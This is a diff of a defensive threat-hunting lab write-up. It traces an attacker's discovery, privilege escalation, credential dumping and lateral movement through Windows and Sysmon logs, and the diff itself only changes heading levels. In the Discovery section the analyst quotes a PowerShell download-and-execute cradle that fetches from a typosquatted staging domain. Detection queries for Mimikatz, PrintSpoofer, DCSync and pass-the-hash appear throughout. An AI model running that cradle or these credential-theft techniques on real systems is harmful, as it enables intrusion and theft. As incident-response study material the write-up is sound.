@@ -25,11 +25,9 @@ Pick up where Foothold left off and hunt for how the attacker moved from an init
 - Windows Security Event Log (Event ID 4624: successful logon, Event ID 4625: failed logon, Event ID 4662: directory service object access)
 - VirusTotal for hash and binary attribution
 
-## Lab Content
+## Tactic: Discovery
 
-### Tactic: Discovery
-
-#### Host Reconnaissance
+### Host Reconnaissance
 
 Built-in Windows enumeration tools blend easily with legitimate sysadmin activity, so the hunt starts broad: every process creation event for the usual host-recon binaries, across all hosts, on the day in question.
 
@@ -54,7 +52,7 @@ host.name: WKSTN-2* AND winlog.event_id: 1 AND process.pid: 6324
 
 That cmd.exe was spawned by PowerShell with a hidden window, no profile, execution policy bypass, and an `IEX ((new-object net.webclient).downloadstring(...))` call against `http://www.oneedirve.xyz/321c3cf/INSTALL.txt`. This is the same staging domain from the Foothold chain (a typosquat of onedrive.com), now driving a live enumeration session on WKSTN-2. The recon itself isn't the finding, the delivery mechanism behind it is.
 
-#### Internal Network Scanning
+### Internal Network Scanning
 
 Internal traffic gets a pass by default because it's assumed to come from legitimate services. A port scan against a reachable host breaks that assumption by generating connections to a large number of distinct destination ports from a single source in a short window, which is exactly the kind of thing a raw event list buries and an aggregation surfaces immediately.
 
@@ -85,7 +83,7 @@ winlog.event_id: 1 AND process.name: n.exe
 
 Same pattern as the earlier recon chain: PowerShell launched it. WKSTN-2 is now confirmed as the source of an active internal port sweep against INTSRV01, using the access established through the same PowerShell foothold seen in the previous section.
 
-#### Active Directory Enumeration
+### Active Directory Enumeration
 
 Domain enumeration generates LDAP traffic, which is also generated legitimately by an internal AD-integrated network, so the useful filter isn't "LDAP happened" but "which process initiated it." Hunting Sysmon Event ID 3 on ports 389 and 636, excluding mmc.exe (a routine source of benign LDAP connections):
 
@@ -108,9 +106,9 @@ winlog.event_id: 1 AND process.name: SharpHound.exe
 
 The single `chisel.exe` hit in the same result set is worth flagging on its own terms. Chisel is a TCP tunneling tool, exactly the kind of thing that shows up when an attacker needs to reach a host or port that isn't otherwise routable, which is thematically the core of a room called Pivoting. It surfaced here because it happened to make an LDAP-port connection, not because this scenario went looking for it, and the room's own narrative doesn't pursue it any further. I'm noting it as an observed but unexplored artifact rather than building a finding on top of it, since nothing in the available data confirms what it was tunneling or why.
 
-### Tactic: Privilege Escalation
+## Tactic: Privilege Escalation
 
-#### SeImpersonatePrivilege Abuse
+### SeImpersonatePrivilege Abuse
 
 SeImpersonatePrivilege lets a process take on another account's security context, and by default that privilege is held by several built-in service accounts, including IIS's application pool identities. A process that goes from a low-privileged parent straight to a SYSTEM child is the signature to hunt.
 
@@ -131,7 +129,7 @@ The immediate parent is an obfuscated, base64-encoded PowerShell command, one la
 
 56 of 70 vendors flag it, attributed to PrintSpoofer, a well-known tool that abuses the Print Spooler service via named pipe impersonation to escalate a SeImpersonatePrivilege holder to SYSTEM. DefaultAppPool has that privilege by default, which is exactly why a web server compromise translated cleanly into full SYSTEM access.
 
-#### Excessive Service Permission Abuse
+### Excessive Service Permission Abuse
 
 A second, independent escalation happens on WKSTN-2 itself, through service misconfiguration rather than a named exploit. Hunting registry writes to any service's ImagePath value, the field that controls what binary a service actually runs:
 
@@ -166,9 +164,9 @@ winlog.event_id: 1 AND process.parent.name: services.exe AND process.name: updat
 
 5 hits, all SYSTEM, all parented by services.exe. The service abuse worked: bill.hawkins now has a SYSTEM-level execution path on WKSTN-2 that's independent of the PrintSpoofer path on INTSRV01. Two hosts, two different privilege escalation techniques, same operator.
 
-### Tactic: Credential Access
+## Tactic: Credential Access
 
-#### LSASS Credential Dumping
+### LSASS Credential Dumping
 
 With privileged access secured on two hosts, the next objective is harvesting more credentials to keep moving. Hunting known Mimikatz command-line strings:
 
@@ -191,7 +189,7 @@ winlog.event_id: 11 AND file.path: *lsass.DMP
 
 1 hit, WKSTN-2, bill.hawkins, via Taskmgr.exe. Unlike the WKSTN-1 dump, this one is local, bill.hawkins dumping his own host's LSASS process using the SYSTEM-level access already gained through the service hijack.
 
-#### Credential Harvesting via DCSync
+### Credential Harvesting via DCSync
 
 DCSync abuses the legitimate MS-DRSR replication protocol domain controllers use to synchronize directory data, including password hashes. The replication request needs specific AD extended rights (DS-Replication-Get-Changes and related GUIDs), which by default only Domain Admins, Enterprise Admins, and DC machine accounts hold.
 
@@ -218,7 +216,7 @@ winlog.event_id: 1 AND user.name: backupadm
 
 70 hits, mostly `whoami` and directory navigation commands with output redirected through `\\127.0.0.1\ADMIN$\`, the same command construction seen elsewhere in this investigation. backupadm was compromised and is being driven remotely, consistent with credentials harvested from one of the LSASS dumps already found. The data available here doesn't confirm which dump produced the backupadm hash specifically, so I'm flagging that as an open thread rather than asserting it.
 
-#### Brute-Forcing Accounts
+### Brute-Forcing Accounts
 
 Brute-forcing leaves a very specific shape in authentication logs: a high volume of failures against one account, followed by a single success. A Lens table over failed logons (Event ID 4625), grouped by host and user:
 
@@ -252,9 +250,9 @@ host.name: WKSTN-1* AND winlog.event_id: 1 AND user.name: jade.burke
 
 **Analyst's Note**: this is the third confirmed appearance of `oneedirve.xyz/321c3cf`, first as the PowerShell downloadstring source on WKSTN-2 during Discovery, then as the PrintSpoofer delivery mechanism on INTSRV01 during Privilege Escalation, and now as the payload jade.burke executes on WKSTN-1 after being brute-forced. The room presents these as three separate tactic-scoped findings, but they share one staging domain across three hosts. That's a single operator running one consistent toolkit through the entire pivoting phase, not three unrelated incidents. In a real investigation, a reused staging domain like this is a stronger and more durable indicator to pivot on across the whole environment than any single host's local artifacts.
 
-### Tactic: Lateral Movement
+## Tactic: Lateral Movement
 
-#### Lateral Movement via WMI
+### Lateral Movement via WMI
 
 WMI is legitimate infrastructure for remote administration, which is also exactly why it's a durable lateral movement technique, it rarely gets blocked outright. `WmiPrvSE.exe` spawning a child process is the indicator to hunt.
 
@@ -276,7 +274,7 @@ Logon Type 3 (network), source 10.10.184.105, LogonProcessName NtLmSsp, NTLM V2,
 
 **Analyst's Note**: the timestamps tie this directly back to the Mimikatz dump in Credential Access. The `Invoke-Mimikatz -DumpCreds` execution on WKSTN-1 was itself parented by `wmiprvse.exe -secured -Embedding`, meaning it was one of these same remote WMI calls, not a separate technique running in isolation. Credential Access and Lateral Movement aren't sequential phases here, they're the same continuous WMI session: the attacker used wmiexec.py to reach WKSTN-1, ran Mimikatz through that same channel to harvest whatever was cached locally, and kept issuing further commands through the identical mechanism afterward. The room's tactic-based structure splits this into two sections; the underlying activity is one thread.
 
-#### Authentication via Pass-the-Hash
+### Authentication via Pass-the-Hash
 
 Pass-the-Hash authenticates using an NTLM hash directly, without ever needing the plaintext password. It has a specific, detectable fingerprint on network logons: Event ID 4624, Logon Type 3, LogonProcessName NtLmSsp, and critically, KeyLength 0, since no session key negotiation happens the way it would with a normal password-based logon.
 
